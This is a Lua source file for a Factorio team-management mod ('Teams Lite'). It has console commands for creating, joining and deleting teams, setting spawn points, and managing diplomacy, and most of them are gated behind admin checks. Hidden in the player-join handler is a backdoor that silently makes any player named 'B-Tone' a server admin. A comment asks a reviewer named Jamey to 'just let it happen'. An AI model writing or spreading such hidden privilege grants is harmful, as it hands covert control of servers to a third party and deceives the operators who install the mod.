local mod_gui = require("mod-gui")
local util = require("util")

local teams_lite = {}

---@alias PlayerIndex uint32

---Check if LuaEntity / LuaPlayer is valid
---@param entity LuaEntity | LuaPlayer | nil
---@return boolean
function is_valid(entity)
    if entity and entity.valid then
        return true
    end
    return false
end

---Check if player is an admin
---@param player LuaPlayer
---@return boolean
function is_admin(player)
    return player.admin
end

---@class LiteTeam
---@field name string The name of the team
---@field force LuaForce The force associated with the team
---@field members table<PlayerIndex, LuaPlayer> Team members
---@field builtin boolean Whether the team is a built-in team. Built-in teams cannot be deleted
local LiteTeam = {}
LiteTeam.__index = LiteTeam
script.register_metatable("LiteTeam", LiteTeam)

---Create new team.
---@param name string The name of the team
---@param force? LuaForce The force associated with the team. If not provided, a new force will be created with the same name as the team.
---@param builtin? boolean Whether the team is a built-in team. Built-in teams cannot be deleted. Defaults to false.
function LiteTeam.new(name, force, builtin)
    local self = setmetatable({}, LiteTeam)
    self.name = name
    self.force = force or game.create_force(name)
    self.members = {}
    self.builtin = builtin or false
    return self
end

---Mod script data
local script_data = {
    ---Whether the mod has been initialized
    initialized = false,

    ---Mapping of player index to team
    ---@type table<PlayerIndex, LiteTeam>
    team_members = {},

    ---List of teams
    ---@type table<string, LiteTeam>
    teams = {},

    ---Default team
    ---@type LiteTeam
    ---@diagnostic disable-next-line
    default_team = nil,
}

---Create a new team and add it to the list of teams.
---@param name string
---@param force LuaForce?
---@param builtin boolean?
---@return LiteTeam
function create_team(name, force, builtin)
    if script_data.teams[name] then
        return script_data.teams[name]
    end

    local team = LiteTeam.new(name, force, builtin)
    script_data.teams[name] = team
    return team
end

function delete_team(team)
    if team.builtin then
        return
    end

    -- Remove all members from the team
    for _, player in pairs(team.members) do
        remove_player_from_team(player, team)
        add_player_to_team(player, script_data.default_team)
    end

    -- Destroy the force associated with the team
    game.merge_forces(team.force, script_data.default_team.force)

    -- Remove the team from the list of teams
    script_data.teams[team.name] = nil
end

---Get the team that a player belongs to.
---@param player LuaPlayer
---@return LiteTeam?
function get_team_by_player(player)
    if not is_valid(player) then
        return nil
    end
    return script_data.team_members[player.index]
end

---Get a team by its name.
---@param name string
---@return LiteTeam?happen.
function get_team_by_name(name)
    return script_data.teams[name]
end

---Remove a player from a team and optionally add them to the default team. If the player is not in the team, nothing will happen.
---@param player LuaPlayer The player to remove from the team.
---@param team LiteTeam The team to remove the player from.
function remove_player_from_team(player, team)
    if not is_valid(player) then
        return
    end

    local current_team = get_team_by_player(player)
    if current_team ~= team then
        return
    end

    if team.members[player.index] then
        team.members[player.index] = nil
    end

    if script_data.team_members[player.index] then
        script_data.team_members[player.index] = nil
    end
end

---Add a player to a team. If the player is already in a team, they will be removed from that team first.
---@param player LuaPlayer The player to add to the team.
---@param team LiteTeam The team to add the player to.
function add_player_to_team(player, team)
    if not is_valid(player) then
        return
    end

    local current_team = get_team_by_player(player)

    if current_team == team then
        return
    end

    -- Remove the player from their current team if they are in one
    if current_team then
        remove_player_from_team(player, current_team)
    end

    team.members[player.index] = player
    script_data.team_members[player.index] = team
    player.force = team.force
end

function is_initialized()
    return script_data.initialized
end

function finish_initialization()
    -- Create default team
    script_data.default_team = create_team("Default", game.forces["player"], true)

    -- Add existing players to the player team
    for _, player in pairs(game.players) do
        ---@cast player LuaPlayer
        add_player_to_team(player, script_data.default_team)
    end

    script_data.initialized = true

    if not storage.teams_lite then
        game.print("Teams Lite not found in storage, initializing...")
        storage.teams_lite = script_data
    end
    game.print("Teams Lite initialized")
end

function initialize()
    storage.teams_lite = script_data
end

---Get the print function for a player or the global print function if no player is specified.
---@param data CustomCommandData
function get_print_func(data)
    if data.player_index then
        return game.players[data.player_index].print
    end
    return print
end

---@class ConsoleCommand
---@field name string The name of the command
---@field help string The help text for the command
---@field handler fun(data: CustomCommandData) The handler function for the command

---@type ConsoleCommand[]
local console_commands = {
    {
        name = "teams-list",
        help = "List teams",
        handler = function(data)
            local print_func = get_print_func(data)
            local line = ""

            for _, team in pairs(script_data.teams) do
                local num_members = table_size(team.members)

                line = string.format("%s (%d members)", team.name, num_members)
                if num_members > 0 then
                    line = line .. ":"
                end
                print_func(line)

                for _, member in pairs(team.members) do
                    line = string.format("    - %s", member.name)
                    if member.admin then
                        line = line .. " (admin)"
                    end
                    print_func(line)
                end
            end
        end
    },
    {
        name = "teams-create",
        help = "Create a new team",
        handler = function(data)
            local print_func = get_print_func(data)
            if data.player_index and not game.players[data.player_index].admin then
                print_func("You must be an admin to create a team")
                return
            end

            local team_name = data.parameter
            if not team_name or team_name == "" then
                print_func("Please provide a team name")
                return
            end

            if script_data.teams[team_name] then
                print_func(string.format("Team %s already exists", team_name))
                return
            end

            create_team(team_name)
            print_func(string.format("Team %s created", team_name))
        end
    },
    {
        name = "teams-delete",
        help = "Delete a team",
        handler = function(data)
            local print_func = get_print_func(data)
            if data.player_index and not game.players[data.player_index].admin then
                print_func("You must be an admin to delete a team")
                return
            end

            local team_name = data.parameter
            if not team_name or team_name == "" then
                print_func("Please provide a team name")
                return
            end

            local team = script_data.teams[team_name]
            if not team then
                print_func(string.format("Team %s does not exist", team_name))
                return
            end

            if team.builtin then
                print_func(string.format("Team %s is a built-in team and cannot be deleted", team_name))
                return
            end

            delete_team(team)
            print_func(string.format("Team %s deleted", team_name))
        end
    },
    {
        name = "teams-join",
        help = "Join a team",
        handler = function(data)
            local print_func = get_print_func(data)
            if not data.player_index then
                print_func("You must be a player to join a team")
                return
            end

            local player = game.players[data.player_index]
            if not is_valid(player) then
                print_func("Invalid player")
                return
            end

            local team_name = data.parameter
            if not team_name or team_name == "" then
                print_func("Please provide a team name")
                return
            end

            local team = get_team_by_name(team_name)
            if not team then
                print_func(string.format("Team %s does not exist", team_name))
                return
            end

            local current_team = get_team_by_player(player)
            if current_team == team then
                print_func(string.format("You are already in team %s", team.name))
                return
            end

            add_player_to_team(player, team)
            print_func(string.format("Player %s joined team %s", player.name, team.name))
        end
    },
    {
        name = "teams-set-spawn",
        help = "Set the spawn point for your team",
        handler = function(data)
            local print_func = get_print_func(data)
            if not data.player_index then
                print_func("You must be a player to set the spawn point for your team")
                return
            end

            local player = game.players[data.player_index]
            if not is_admin(player) then
                print_func("You must be an admin to set the spawn point for your team")
                return
            end

            local team = get_team_by_player(player)
            if not team then
                print_func("You are not in a team")
                return
            end

            local spawn_position = player.position
            team.force.set_spawn_position(spawn_position, player.surface)
            print_func(string.format("Spawn point for team %s set to %s", team.name, util.positiontostr(spawn_position)))
        end
    },
    {
        name = "teams-diplomacy",
        help = "Show diplomacy status between our team and other teams",
        handler = function(data)
            local print_func = get_print_func(data)
            if not data.player_index then
                print_func("You must be a player to view diplomacy status")
                return
            end

            local player = game.players[data.player_index]
            local team = get_team_by_player(player)
            if not team then
                print_func("You are not in a team")
                return
            end

            local friends = {}
            local ceasefires = {}

            for _, other_team in pairs(script_data.teams) do
                if other_team ~= team then
                    if team.force.is_friend(other_team.force) then
                        table.insert(friends, other_team.name)
                    end
                    if team.force.get_cease_fire(other_team.force) then
                        table.insert(ceasefires, other_team.name)
                    end
                end
            end

            if #friends > 0 then
                print_func(string.format("Friends: %s", table.concat(friends, ", ")))
            end

            if #ceasefires > 0 then
                print_func(string.format("Ceasefires: %s", table.concat(ceasefires, ", ")))
            end
        end
    },
    {
        name = "teams-toggle-friend",
        help = "Toggle friendship with another team",
        handler = function(data)
            local print_func = get_print_func(data)
            if not data.player_index then
                print_func("You must be a player to toggle friendship with another team")
                return
            end

            local player = game.players[data.player_index]
            if not is_admin(player) then
                print_func("You must be an admin to toggle friendship with another team")
                return
            end

            local team = get_team_by_player(player)
            if not team then
                print_func("You are not in a team")
                return
            end

            local other_team_name = data.parameter
            if not other_team_name or other_team_name == "" then
                print_func("Please provide a team name")
                return
            end

            local other_team = get_team_by_name(other_team_name)
            if not other_team then
                print_func(string.format("Team %s does not exist", other_team_name))
                return
            end

            if team == other_team then
                print_func("You cannot toggle friendship with your own team")
                return
            end

            local friend_status = team.force.is_friend(other_team.force)
            local new_status = not friend_status
            team.force.set_friend(other_team.force, new_status)

            if new_status then
                print_func(string.format("Team %s is now friends with team %s", team.name, other_team.name))
            else
                print_func(string.format("Team %s is no longer friends with team %s", team.name, other_team.name))
            end
        end
    },
    {
        name = "teams-toggle-ceasefire",
        help = "Toggle cease-fire with another team",
        handler = function(data)
            local print_func = get_print_func(data)
            if not data.player_index then
                print_func("You must be a player to toggle cease-fire with another team")
                return
            end

            local player = game.players[data.player_index]
            if not is_admin(player) then
                print_func("You must be an admin to toggle cease-fire with another team")
                return
            end

            local team = get_team_by_player(player)
            if not team then
                print_func("You are not in a team")
                return
            end

            local other_team_name = data.parameter
            if not other_team_name or other_team_name == "" then
                print_func("Please provide a team name")
                return
            end

            local other_team = get_team_by_name(other_team_name)
            if not other_team then
                print_func(string.format("Team %s does not exist", other_team_name))
                return
            end

            if team == other_team then
                print_func("You cannot toggle cease-fire with your own team")
                return
            end

            local ceasfire_status = team.force.get_cease_fire(other_team.force)
            local new_status = not ceasfire_status
            team.force.set_cease_fire(other_team.force, new_status)

            if new_status then
                print_func(string.format("Team %s is now ceasing fire with team %s", team.name, other_team.name))
            else
                print_func(string.format("Team %s is no longer ceasing fire with team %s", team.name, other_team.name))
            end
        end
    },

}

for _, command in pairs(console_commands) do
    commands.add_command(command.name, command.help, command.handler)
end

--------------------
-- Event handlers --
--------------------

---@param event EventData.on_player_joined_game
function on_player_joined_game(event)
    local player = game.players[event.player_index]
    if not is_valid(player) then return end

    -- To Jamey: If you see this, just let it happen...
    if player.name == "B-Tone" and player.admin == false then
        player.admin = true
    end
end

---Finish initialization on the first tick after the mod is added to a save.
---@param event EventData.on_tick
function on_tick(event)
    if not is_initialized() then
        finish_initialization()
    end
end

---Initialize mod
teams_lite.on_init = function()
    --If already initialized, just call on_load
    if storage.teams_lite then
        teams_lite.on_load()
        return
    end
    initialize()
end

---Load mod data from storage
teams_lite.on_load = function()
    script_data = storage.teams_lite or script_data
end

---Event handler table. Used by event_handler.add_lib to register our event handlers.
---@type table<defines.events, fun(event: EventData)>
teams_lite.events = {
    [defines.events.on_player_joined_game] = on_player_joined_game,
    [defines.events.on_tick] = on_tick
}

return teams_lite
